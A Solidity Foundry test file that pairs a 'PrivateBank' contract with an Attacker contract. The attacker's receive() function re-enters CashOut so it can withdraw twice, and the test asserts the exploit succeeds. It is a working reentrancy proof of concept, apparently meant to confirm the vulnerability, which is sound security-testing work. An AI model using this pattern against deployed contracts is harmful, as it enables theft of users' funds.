
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank, Log} from "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {

    PrivateBank public _contractUnderTest;
    Log public transferLog;
    Attacker public _attacker;

    function setUp() public {
        transferLog = new Log();
        _contractUnderTest = new PrivateBank(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 4);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;
    bool public reenteredWithOldState;

    constructor(address victimAddress) { 
        bank = PrivateBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        reenteredWithOldState = false;
        
        bank.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = bank.balances(address(this));
        storedVal = val;
        bank.CashOut(val);
        exploitSucceeded = reenteredWithOldState && attackCallCount >= 2;
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            reenteredWithOldState = (bank.balances(address(this)) == initialSnapshot);
            attackCallCount++;
            bank.CashOut(storedVal);
        }
    }
}
